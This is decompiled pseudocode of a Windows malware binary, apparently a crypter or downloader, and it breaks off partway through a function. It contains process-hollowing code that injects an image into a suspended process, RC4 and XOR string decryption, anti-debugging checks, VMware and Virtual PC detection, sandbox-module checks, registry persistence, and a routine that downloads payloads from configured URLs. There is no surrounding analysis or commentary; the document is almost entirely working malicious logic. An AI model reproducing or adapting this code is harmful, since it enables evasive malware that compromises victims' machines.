// 40710C: using guessed type int (__stdcall *dword_40710C)(_DWORD);
// 407110: using guessed type int (__stdcall *dword_407110)(_DWORD, _DWORD, _DWORD);
// 407114: using guessed type int (__stdcall *dword_407114)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407118: using guessed type int (__stdcall *dword_407118)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40711C: using guessed type int (__stdcall *__)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407120: using guessed type int (__stdcall *dword_407120)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407124: using guessed type int (__stdcall *dword_407124)(_DWORD);
// 407128: using guessed type int (__stdcall *dword_407128)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40712C: using guessed type int (__stdcall *dword_40712C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401DC3) --------------------------------------------------------
int __usercall sub_401DC3@<eax>(int a1@<ebx>, int a2, _WORD *a3)
{
  LPSTR CommandLineA; // eax
  char *v5; // [esp+0h] [ebp-34Ch]
  HANDLE hProcess; // [esp+4h] [ebp-348h] BYREF
  int v7; // [esp+8h] [ebp-344h]
  FARPROC v8; // [esp+14h] [ebp-338h]
  int v9[179]; // [esp+18h] [ebp-334h] BYREF
  FARPROC ProcAddress; // [esp+2E4h] [ebp-68h]
  FARPROC v11; // [esp+2E8h] [ebp-64h]
  _DWORD *v12; // [esp+2ECh] [ebp-60h]
  int v13; // [esp+2F0h] [ebp-5Ch] BYREF
  FARPROC v14; // [esp+2F4h] [ebp-58h]
  _WORD *v15; // [esp+2F8h] [ebp-54h]
  FARPROC v16; // [esp+2FCh] [ebp-50h]
  int i; // [esp+300h] [ebp-4Ch]
  int v18[17]; // [esp+304h] [ebp-48h] BYREF
  FARPROC v19; // [esp+348h] [ebp-4h]

  sub_403F8E(a1, (char *)v18, 0, 0x44u);
  v18[0] = 68;
  v9[0] = 65543;
  v15 = a3;
  if ( *a3 != 23117 )
    return 0;
  v5 = (char *)a3 + *((_DWORD *)v15 + 15);
  if ( *(_DWORD *)v5 != 17744 )
    return 0;
  ProcAddress = GetProcAddress(dword_4070EC, &a6A[12]);
  v8 = GetProcAddress(dword_4070F4, asc_40609C);
  v16 = GetProcAddress(dword_4070F4, asc_4060CC);
  v14 = GetProcAddress(dword_4070F4, asc_4060E0);
  v19 = GetProcAddress(dword_4070F4, asc_4060F4);
  v11 = GetProcAddress(dword_4070F4, asc_4060B4);
  CommandLineA = GetCommandLineA();
  if ( !((int (__stdcall *)(int, LPSTR, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, int *, HANDLE *))ProcAddress)(
          a2,
          CommandLineA,
          0,
          0,
          0,
          4,
          0,
          0,
          v18,
          &hProcess) )
    return 0;
  ((void (__stdcall *)(HANDLE, _DWORD))v8)(hProcess, *((_DWORD *)v5 + 13));
  if ( !dword_40712C(hProcess, *((_DWORD *)v5 + 13), *((_DWORD *)v5 + 20), 12288, 64) )
    return 0;
  v13 = 0;
  ((void (__stdcall *)(HANDLE, _DWORD, _WORD *, _DWORD, int *))v11)(
    hProcess,
    *((_DWORD *)v5 + 13),
    a3,
    *((_DWORD *)v5 + 21),
    &v13);
  if ( !v13 )
    return 0;
  for ( i = 0; i < *((unsigned __int16 *)v5 + 3); ++i )
  {
    v12 = (_DWORD *)((char *)&a3[20 * i + 124] + *((_DWORD *)v15 + 15));
    ((void (__stdcall *)(HANDLE, int, char *, _DWORD, _DWORD))v11)(
      hProcess,
      v12[3] + *((_DWORD *)v5 + 13),
      (char *)a3 + v12[5],
      v12[4],
      0);
  }
  ((void (__stdcall *)(int, int *))v16)(v7, v9);
  ((void (__stdcall *)(HANDLE, int, char *, int, _DWORD))v11)(hProcess, v9[41] + 8, v5 + 52, 4, 0);
  v9[44] = *((_DWORD *)v5 + 10) + *((_DWORD *)v5 + 13);
  ((void (__stdcall *)(int, int *))v14)(v7, v9);
  ((void (__stdcall *)(int, _DWORD))v19)(v7, 0);
  sub_40204B(hProcess);
  return 1;
}
// 40712C: using guessed type int (__stdcall *dword_40712C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040204B) --------------------------------------------------------
void __cdecl sub_40204B(HANDLE hProcess)
{
  char v1[12]; // [esp+4h] [ebp-84h] BYREF
  LPCVOID lpBaseAddress; // [esp+10h] [ebp-78h]
  LPCVOID Buffer; // [esp+2Ch] [ebp-5Ch] BYREF
  char v4[36]; // [esp+30h] [ebp-58h] BYREF
  int v5; // [esp+54h] [ebp-34h]
  LPVOID v6; // [esp+58h] [ebp-30h]
  int v7; // [esp+78h] [ebp-10h]
  LPVOID v8; // [esp+7Ch] [ebp-Ch]
  LPWSTR lpFilename; // [esp+80h] [ebp-8h]
  int i; // [esp+84h] [ebp-4h]

  v7 = sub_403CA4((int)hProcess);
  if ( v7 )
  {
    Buffer = 0;
    for ( i = 0; ; ++i )
    {
      if ( !ReadProcessMemory(hProcess, (LPCVOID)(v7 + 12), &Buffer, 4u, 0) )
      {
        MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
        MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
        return;
      }
      if ( ReadProcessMemory(hProcess, Buffer, v1, 0x28u, 0) )
        break;
      MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
      Sleep(5u);
      if ( i >= 600 )
        return;
    }
    if ( ReadProcessMemory(hProcess, lpBaseAddress, v4, 0x48u, 0) )
    {
      lpFilename = (LPWSTR)sub_403F75(0x208u);
      GetModuleFileNameW(0, lpFilename, 0x104u);
      LOWORD(v5) = 2 * lstrlenW(lpFilename);
      v8 = (LPVOID)dword_40712C(hProcess, 0, (unsigned __int16)v5, 12288, 64);
      if ( v8 && WriteProcessMemory(hProcess, v8, lpFilename, (unsigned __int16)v5, 0) )
      {
        v6 = v8;
        if ( !WriteProcessMemory(hProcess, (LPVOID)lpBaseAddress, v4, 0x48u, 0) )
        {
          MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
          MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
        }
      }
      else
      {
        MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
      }
    }
    else
    {
      MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    }
  }
  else
  {
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  }
}
// 40712C: using guessed type int (__stdcall *dword_40712C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40204B: using guessed type char var_84[12];

//----- (00402237) --------------------------------------------------------
char *__usercall sub_402237@<eax>(int a1@<ebx>, int a2, _DWORD *a3)
{
  int v4; // [esp+14h] [ebp-34h]
  int v5; // [esp+18h] [ebp-30h]
  int v6; // [esp+1Ch] [ebp-2Ch]
  int v7; // [esp+20h] [ebp-28h]
  int v8; // [esp+24h] [ebp-24h]
  _BYTE *v9; // [esp+28h] [ebp-20h]
  _BYTE *v10; // [esp+28h] [ebp-20h]
  FARPROC ProcAddress; // [esp+2Ch] [ebp-1Ch]
  FARPROC v12; // [esp+30h] [ebp-18h]
  FARPROC v13; // [esp+34h] [ebp-14h]
  int i; // [esp+38h] [ebp-10h]
  int j; // [esp+38h] [ebp-10h]
  FARPROC v16; // [esp+3Ch] [ebp-Ch]
  int v17; // [esp+40h] [ebp-8h]
  char *v18; // [esp+44h] [ebp-4h]

  ProcAddress = GetProcAddress(dword_4070EC, asc_406130);
  v12 = GetProcAddress(dword_4070EC, a9);
  v13 = GetProcAddress(dword_4070EC, a9_0);
  v16 = GetProcAddress(dword_4070EC, a9_1);
  for ( i = 1; ; ++i )
  {
    v9 = sub_403F75(0xAu);
    sub_402D20(i, v9, 10);
    v8 = ((int (__stdcall *)(_DWORD, _BYTE *, int))ProcAddress)(0, v9, a2);
    if ( !v8 )
      break;
    *a3 += ((int (__stdcall *)(_DWORD, int))v12)(0, v8);
    sub_403E62(v9);
  }
  if ( !*a3 )
    return 0;
  v18 = (char *)sub_403F75(*a3 + 1);
  sub_403F8E(a1, v18, 0, *a3 + 1);
  v17 = 0;
  for ( j = 1; ; ++j )
  {
    v10 = sub_403F75(0xAu);
    sub_402D20(j, v10, 10);
    v7 = ((int (__stdcall *)(_DWORD, _BYTE *, int))ProcAddress)(0, v10, a2);
    if ( !v7 )
      break;
    v6 = ((int (__stdcall *)(_DWORD, int))v12)(0, v7);
    v4 = ((int (__stdcall *)(_DWORD, int))v13)(0, v7);
    if ( !v4 )
      break;
    v5 = ((int (__stdcall *)(int))v16)(v4);
    if ( !v5 )
      break;
    sub_403FC1(&v18[v17], v5, v6);
    v17 += v6;
    sub_403E62(v10);
  }
  return v18;
}

//----- (0040241B) --------------------------------------------------------
_BYTE *__cdecl sub_40241B(int a1)
{
  int v2[2]; // [esp+4h] [ebp-10h] BYREF
  int v3; // [esp+Ch] [ebp-8h] BYREF
  LPVOID v4; // [esp+10h] [ebp-4h]

  v2[0] = 0;
  v4 = sub_403F75(0x438u);
  v2[1] = 2239;
  v3 = 1081;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  if ( a1 )
  {
    if ( !dword_407104(-2147483646, &unk_406170, 0, 131097, v2) )
    {
      if ( !dword_407108(v2[0], 0, 0, 0, v4, &v3) )
      {
        dword_40710C(v2[0]);
        return sub_403EE9((int)v4, asc_4064F4);
      }
      dword_40710C(v2[0]);
    }
    return 0;
  }
  else
  {
    if ( !dword_407104(0x80000000, &unk_4062D0, 0, 983103, v2) )
    {
      if ( !dword_407108(v2[0], 0, 0, 0, v4, &v3) )
      {
        dword_40710C(v2[0]);
        return sub_403EE9((int)v4, asc_4064F8);
      }
      dword_40710C(v2[0]);
    }
    return 0;
  }
}
// 407104: using guessed type int (__stdcall *dword_407104)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407108: using guessed type int (__stdcall *dword_407108)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40710C: using guessed type int (__stdcall *dword_40710C)(_DWORD);

//----- (0040253C) --------------------------------------------------------
const CHAR *sub_40253C()
{
  const CHAR *result; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  unsigned int v3; // [esp+10h] [ebp-20h]
  const CHAR *lpString2; // [esp+14h] [ebp-1Ch]
  const CHAR *lpString2a; // [esp+14h] [ebp-1Ch]
  unsigned int v6; // [esp+18h] [ebp-18h]
  CHAR *v7; // [esp+1Ch] [ebp-14h]
  CHAR *v8; // [esp+20h] [ebp-10h]
  FARPROC ProcAddress; // [esp+24h] [ebp-Ch]
  CHAR *lpString1; // [esp+28h] [ebp-8h]
  CHAR *v11; // [esp+2Ch] [ebp-4h]

  ProcAddress = GetProcAddress(dword_4070FC, a30);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  result = sub_403EE9((int)&byte_4066EE, asc_4064FC);
  lpString2 = result;
  if ( result )
  {
    lpString1 = (CHAR *)sub_403F75(0xAu);
    v7 = (CHAR *)sub_403F75(0xAu);
    v8 = (CHAR *)sub_403F75(0x28u);
    v11 = (CHAR *)sub_403F75(0xFFu);
    lstrcpyA(lpString1, lpString2);
    v1 = sub_403EE9(0, asc_406500);
    lstrcpyA(v7, v1);
    v2 = sub_403EE9(0, asc_406504);
    lstrcpyA(v8, v2);
    lpString2a = sub_403EE9(0, asc_406508);
    lstrcpyA(v11, lpString2a);
    v3 = sub_403FE3(lpString1);
    v6 = sub_403FE3(v7);
    return (const CHAR *)((int (__stdcall *)(_DWORD, CHAR *, CHAR *, unsigned int))ProcAddress)(0, v11, v8, v6 + v3);
  }
  return result;
}
// 4066EE: using guessed type char byte_4066EE;

//----- (0040268C) --------------------------------------------------------
int sub_40268C()
{
  int v0; // eax
  int v1; // eax
  int v3; // [esp+4h] [ebp-Ch] BYREF
  char *v4; // [esp+8h] [ebp-8h]
  int v5; // [esp+Ch] [ebp-4h] BYREF

  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  if ( String1 == 48 )
  {
    if ( byte_406551 != 48 )
    {
      v3 = 0;
      v4 = (char *)sub_403F75(0x105u);
      sub_403F60(v4, asc_406318);
      sub_403E7C(v4, &byte_406551);
      MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
      if ( !dword_4070E8 || dword_406474 )
      {
        dword_407110(-2147483647, v4, &v3);
        MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
      }
      else
      {
        dword_407110(-2147483646, v4, &v3);
      }
      MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
      v1 = sub_403FF4((int)dword_406524);
      dword_407114(v3, &unk_4061B4, 0, 1, dword_406524, v1);
      dword_40710C(v3);
    }
  }
  else
  {
    if ( !dword_4070E8 || dword_406474 )
    {
      dword_407110(-2147483647, &unk_4062E8, &v5);
    }
    else
    {
      dword_407110(-2147483646, &unk_4062E8, &v5);
      MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    }
    v0 = sub_403FF4((int)dword_406524);
    dword_407114(v5, &String1, 0, 1, dword_406524, v0);
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    dword_40710C(v5);
  }
  return MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
}
// 406474: using guessed type int dword_406474;
// 406551: using guessed type char byte_406551;
// 4070E8: using guessed type int dword_4070E8;
// 40710C: using guessed type int (__stdcall *dword_40710C)(_DWORD);
// 407110: using guessed type int (__stdcall *dword_407110)(_DWORD, _DWORD, _DWORD);
// 407114: using guessed type int (__stdcall *dword_407114)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402854) --------------------------------------------------------
LPSTR __cdecl sub_402854(char *a1)
{
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  FARPROC ProcAddress; // [esp+0h] [ebp-18h]
  FARPROC v7; // [esp+4h] [ebp-14h]
  FARPROC v8; // [esp+8h] [ebp-10h]
  unsigned int dwMilliseconds; // [esp+10h] [ebp-8h]

  ProcAddress = GetProcAddress(dword_4070EC, a95);
  v7 = GetProcAddress(dword_4070EC, a93);
  v8 = GetProcAddress(dword_4070EC, a372);
  dwMilliseconds = 1000 * sub_403FE3(byte_4070D4);
  if ( byte_4065A1 == 49 || byte_4065A1 == 50 )
  {
    if ( !dword_4070E8 || dword_406474 )
    {
      v5 = sub_403E9E(a8);
      sub_403F60(dword_406524, v5);
    }
    else if ( lstrcmpA(byte_4065A3, aA) )
    {
      if ( sub_403EC7(byte_4065A3, byte_406354) )
      {
        if ( sub_403EC7(byte_4065A3, a3a) )
          v4 = sub_403E9E(a8);
        else
          v4 = sub_403E9E(a3S);
        sub_403F60(dword_406524, v4);
      }
      else
      {
        v3 = sub_403E9E(a0);
        sub_403F60(dword_406524, v3);
        sub_403E7C(dword_406524, a0_0);
      }
    }
    else
    {
      v2 = sub_403E9E(a0);
      sub_403F60(dword_406524, v2);
    }
    sub_403E7C(dword_406524, asc_40650C);
    lstrcatA(dword_406524, byte_406578);
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    if ( sub_403EC7(a1, dword_406524) )
    {
      MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
      MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
      if ( byte_4065A1 == 49 )
      {
        ((void (__stdcall *)(char *, LPSTR, int))ProcAddress)(a1, dword_406524, 3);
        MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
      }
      else
      {
        ((void (__stdcall *)(char *, LPSTR, _DWORD))v7)(a1, dword_406524, 0);
      }
      if ( byte_4065A7 == 49 )
        ((void (__stdcall *)(LPSTR, int))v8)(dword_406524, 2);
      if ( byte_4066EE != 48 )
        sub_40253C();
      if ( dwMilliseconds )
        Sleep(dwMilliseconds);
      sub_40268C();
      if ( dwMilliseconds == -1000 )
        ExitProcess(0);
      dword_4070E4 = 1;
      return dword_406524;
    }
    else
    {
      dword_4070E4 = 0;
      return a1;
    }
  }
  else
  {
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    dword_4070E4 = 0;
    return a1;
  }
}
// 406474: using guessed type int dword_406474;
// 4065A7: using guessed type char byte_4065A7;
// 4066EE: using guessed type char byte_4066EE;
// 4070E4: using guessed type int dword_4070E4;
// 4070E8: using guessed type int dword_4070E8;

//----- (00402B4E) --------------------------------------------------------
int sub_402B4E()
{
  char v1[8]; // [esp+0h] [ebp-24h] BYREF
  FARPROC v2; // [esp+8h] [ebp-1Ch]
  int v3; // [esp+Ch] [ebp-18h] BYREF
  FARPROC ProcAddress; // [esp+10h] [ebp-14h]
  int v5; // [esp+14h] [ebp-10h] BYREF
  __int16 v6; // [esp+18h] [ebp-Ch]
  int v7; // [esp+1Ch] [ebp-8h]
  FARPROC v8; // [esp+20h] [ebp-4h]

  v7 = 3818;
  v6 = 570;
  ProcAddress = GetProcAddress(hModule, asc_406424);
  if ( !ProcAddress )
    return 1;
  v8 = GetProcAddress(hModule, asc_406440);
  if ( !v8 )
    return 1;
  v2 = GetProcAddress(hModule, asc_406458);
  if ( !v2 )
    return 1;
  v1[0] = 0;
  v1[1] = 0;
  v1[2] = 0;
  v1[3] = 0;
  v1[4] = 0;
  v1[5] = 5;
  if ( !((int (__stdcall *)(char *, int, int, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int *))ProcAddress)(
          v1,
          2,
          32,
          544,
          0,
          0,
          0,
          0,
          0,
          0,
          &v5) )
    return 0;
  v3 = 0;
  if ( !((int (__stdcall *)(_DWORD, int, int *))v8)(0, v5, &v3) )
    v3 = 0;
  ((void (__stdcall *)(int))v2)(v5);
  return v3;
}

//----- (00402C4E) --------------------------------------------------------
BOOL sub_402C4E()
{
  int v1; // [esp+0h] [ebp-14h]
  int v2; // [esp+8h] [ebp-Ch] BYREF
  int v3; // [esp+Ch] [ebp-8h] BYREF
  int v4; // [esp+10h] [ebp-4h] BYREF

  v2 = 0;
  v3 = 4;
  v1 = dword_407104(-2147483646, &unk_4063DC, 0, 1, &v2);
  if ( v1 )
  {
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    return v1 == 5;
  }
  else
  {
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    if ( dword_407108(v2, &unk_406418, 0, 0, &v4, &v3) )
    {
      MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
      dword_40710C(v2);
      return 0;
    }
    else
    {
      dword_40710C(v2);
      return v4 != 0;
    }
  }
}
// 407104: using guessed type int (__stdcall *dword_407104)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 407108: using guessed type int (__stdcall *dword_407108)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40710C: using guessed type int (__stdcall *dword_40710C)(_DWORD);

//----- (00402D20) --------------------------------------------------------
_BYTE *__cdecl sub_402D20(int a1, _BYTE *a2, int a3)
{
  char *v4; // [esp+0h] [ebp-18h]
  int v5; // [esp+4h] [ebp-14h]
  char v6; // [esp+8h] [ebp-10h]
  _BYTE *v7; // [esp+10h] [ebp-8h]
  char *i; // [esp+10h] [ebp-8h]
  int v9; // [esp+14h] [ebp-4h]

  if ( a3 >= 2 && a3 <= 16 )
  {
    v7 = a2;
    v9 = a1;
    do
    {
      v5 = v9 % a3;
      if ( v9 % a3 < 0 )
        v5 = -v5;
      *v7++ = byte_406460[v5];
      v9 /= a3;
    }
    while ( v9 );
    if ( a1 < 0 && a3 == 10 )
      *v7++ = 45;
    *v7 = 0;
    v4 = a2;
    for ( i = v7 - 1; v4 < i; --i )
    {
      v6 = *v4;
      *v4 = *i;
      *i = v6;
      ++v4;
    }
    return a2;
  }
  else
  {
    *a2 = 0;
    return a2;
  }
}

//----- (00402DFF) --------------------------------------------------------
int sub_402DFF()
{
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  __asm { vpcext  7, 0Bh }
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  return 1;
}

//----- (00402EEC) --------------------------------------------------------
BOOL sub_402EEC()
{
  return GetModuleHandleA(ModuleName)
      || GetModuleHandleA(&ModuleName[12])
      || GetModuleHandleA(aA12)
      || GetModuleHandleA(&aA12[12])
      || GetModuleHandleA(&byte_4061F4);
}

//----- (00402F45) --------------------------------------------------------
BOOL sub_402F45()
{
  _DWORD v1[2]; // [esp+1Ch] [ebp-30h] BYREF

  strcpy((char *)v1, "hXMVÖ\v");
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  __indword(0x5658u);
  return v1[0] == -2038049691;
}

//----- (00403053) --------------------------------------------------------
BOOL sub_403053()
{
  HANDLE CurrentProcess; // eax
  int v2[3]; // [esp+0h] [ebp-18h] BYREF
  __int16 v3; // [esp+Ch] [ebp-Ch]
  int v4; // [esp+10h] [ebp-8h]
  int v5; // [esp+14h] [ebp-4h]

  if ( IsDebuggerPresent() )
    return 1;
  v2[0] = 0;
  v2[1] = 4830;
  v3 = 4390;
  v4 = 7;
  v5 = 1022;
  v2[2] = 1619;
  CurrentProcess = GetCurrentProcess();
  dword_407128(CurrentProcess, 7, v2, 4, 0);
  return v2[0] != 0;
}
// 407128: using guessed type int (__stdcall *dword_407128)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004030BF) --------------------------------------------------------
int sub_4030BF()
{
  int v1; // [esp+4h] [ebp-Ch] BYREF
  __int16 v2; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = 4590;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  for ( i = 0; i < 5000000; ++i )
  {
    v1 = 7610;
    sub_403E62(&v1);
  }
  return 0;
}

//----- (00403131) --------------------------------------------------------
int __cdecl sub_403131(int a1, int a2, unsigned int a3, unsigned int a4)
{
  int v5; // [esp+4h] [ebp-410h]
  unsigned int k; // [esp+8h] [ebp-40Ch]
  int i; // [esp+Ch] [ebp-408h]
  int j; // [esp+Ch] [ebp-408h]
  int v9[256]; // [esp+10h] [ebp-404h]
  int v10; // [esp+410h] [ebp-4h]

  v5 = 0;
  for ( i = 0; i < 256; ++i )
    v9[i] = i;
  for ( j = 0; j < 256; ++j )
  {
    v5 = (*(unsigned __int8 *)(a2 + j % a4) + v9[j] + v5) % 256;
    LOBYTE(v10) = v9[j];
    v9[j] = v9[v5];
    v9[v5] = (unsigned __int8)v10;
  }
  for ( k = 0; k < a3; ++k )
  {
    j = (j + 1) % 256;
    v5 = (v9[j] + v5) % 256;
    LOBYTE(v10) = v9[j];
    v9[j] = v9[v5];
    v9[v5] = (unsigned __int8)v10;
    *(_BYTE *)(k + a1) ^= LOBYTE(v9[(v9[v5] + v9[j]) % 256]);
  }
  return a1;
}
// 403131: using guessed type int var_404[256];

//----- (00403335) --------------------------------------------------------
int sub_403335()
{
  sub_4036EB(4218984, 14);
  sub_4036EB((int)asc_40609C, 20);
  sub_4036EB((int)asc_4060B4, 20);
  sub_4036EB((int)asc_4060CC, 18);
  sub_4036EB((int)asc_4060E0, 18);
  sub_4036EB((int)asc_4060F4, 14);
  sub_4036EB((int)a1, 14);
  sub_4036EB((int)asc_406130, 13);
  sub_4036EB((int)a9, 14);
  sub_4036EB((int)a9_0, 12);
  sub_4036EB((int)a9_1, 12);
  sub_4036EB((int)ProcName, 13);
  sub_4036EB((int)a3067, 16);
  sub_4036EB((int)&unk_4062D0, 23);
  sub_4036EB((int)a386, 13);
  sub_4036EB((int)a32, 14);
  sub_4036EB((int)a3, 11);
  sub_4036EB((int)&unk_4062E8, 45);
  sub_4036EB((int)asc_406318, 53);
  sub_4036EB((int)a0, 10);
  sub_4036EB((int)a0_0, 9);
  sub_4036EB((int)a95, 11);
  sub_4036EB((int)a93, 9);
  sub_4036EB((int)a372, 18);
  sub_4036EB((int)asc_406104, 25);
  sub_4036EB((int)a87, 13);
  sub_4036EB((int)a87_0, 16);
  sub_4036EB((int)a87_1, 16);
  sub_4036EB((int)a87_2, 19);
  sub_4036EB((int)LibFileName, 12);
  sub_4036EB((int)a25, 12);
  sub_4036EB((int)&byte_406030, 9);
  sub_4036EB((int)a6A, 11);
  sub_4036EB((int)&byte_40624C, 10);
  sub_4036EB((int)&unk_4063C8, 16);
  sub_4036EB((int)a30, 11);
  sub_4036EB((int)&unk_406390, 8);
  sub_4036EB((int)&byte_406258, 11);
  sub_4036EB((int)asc_4062B4, 13);
  sub_4036EB((int)aA, 3);
  sub_4036EB((int)byte_406354, 3);
  sub_4036EB((int)a3a, 3);
  sub_4036EB((int)byte_40635C, 2);
  sub_4036EB((int)String2, 2);
  sub_4036EB((int)a8, 3);
  sub_4036EB((int)a3S, 7);
  sub_4036EB((int)&unk_406388, 4);
  sub_4036EB((int)&unk_4063DC, 57);
  sub_4036EB((int)&unk_406418, 9);
  sub_4036EB((int)ModuleName, 11);
  sub_4036EB((int)&ModuleName[12], 11);
  sub_4036EB((int)aA12, 11);
  sub_4036EB((int)&aA12[12], 13);
  sub_4036EB((int)&byte_4061F4, 11);
  sub_4036EB((int)&unk_406170, 64);
  sub_4036EB((int)&unk_4061B4, 8);
  sub_4036EB((int)asc_406424, 24);
  sub_4036EB((int)asc_406440, 20);
  sub_4036EB((int)asc_406458, 7);
  sub_4036EB((int)asc_406084, 11);
  sub_4036EB((int)asc_406090, 9);
  sub_4036EB((int)asc_406078, 11);
  return sub_4036EB((int)byte_406460, 16);
}

//----- (004036EB) --------------------------------------------------------
int __cdecl sub_4036EB(int a1, int a2)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i <= a2; ++i )
  {
    *(_BYTE *)(i + a1) ^= String[i % dword_406520];
    result = i + 1;
  }
  return result;
}
// 406520: using guessed type int dword_406520;

//----- (0040372F) --------------------------------------------------------
int __usercall StartAddress@<eax>(int a1@<ebx>)
{
  int result; // eax
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  int v6; // [esp+8h] [ebp-34h]
  char *lpString1; // [esp+Ch] [ebp-30h]
  int v8; // [esp+10h] [ebp-2Ch]
  SIZE_T dwBytes; // [esp+14h] [ebp-28h] BYREF
  int v10; // [esp+18h] [ebp-24h]
  LPVOID v11; // [esp+1Ch] [ebp-20h]
  int j; // [esp+20h] [ebp-1Ch] BYREF
  FARPROC v13; // [esp+24h] [ebp-18h]
  int v14; // [esp+28h] [ebp-14h]
  FARPROC ProcAddress; // [esp+2Ch] [ebp-10h]
  FARPROC v16; // [esp+30h] [ebp-Ch]
  FARPROC v17; // [esp+34h] [ebp-8h]
  int i; // [esp+38h] [ebp-4h]

  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  ProcAddress = GetProcAddress(dword_4070F8, a87);
  v16 = GetProcAddress(dword_4070F8, a87_0);
  v13 = GetProcAddress(dword_4070F8, a87_1);
  v17 = GetProcAddress(dword_4070F8, a87_2);
  v14 = ((int (__stdcall *)(_DWORD, int, _DWORD, _DWORD, _DWORD))ProcAddress)(0, 1, 0, 0, 0);
  if ( !v14 )
    return MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  for ( i = 0; i < 5; ++i )
  {
    MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    result = byte_40688C[424 * i];
    if ( result == 48 )
      return result;
    if ( dword_4070E4 || byte_406A32[424 * i] != 48 && byte_406A32[424 * i] != 49 )
    {
      v8 = ((int (__stdcall *)(int, char *, _DWORD, _DWORD, _DWORD, _DWORD))v16)(v14, &byte_40688C[424 * i], 0, 0, 0, 0);
      if ( !v8 )
      {
        MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
        break;
      }
      v11 = sub_403F75(0x400u);
      v10 = 0;
      dwBytes = 0;
      for ( j = 0; ; sub_403FC1((_BYTE *)(dwBytes - j + v10), (int)v11, j) )
      {
        ((void (__stdcall *)(int, LPVOID, int, int *))v13)(v8, v11, 1023, &j);
        if ( !j )
          break;
        dwBytes += j;
        v10 = (int)sub_403DB0(a1, v10, dwBytes, dwBytes - j);
      }
      if ( lstrcmpA((LPCSTR)&unk_406904 + 424 * i, byte_40635C) )
      {
        if ( lstrcmpA((LPCSTR)&unk_406904 + 424 * i, String2) )
        {
          if ( lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, byte_406354)
            && lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, aA)
            && lstrcmpiA((LPCSTR)&unk_406904 + 424 * i, a8)
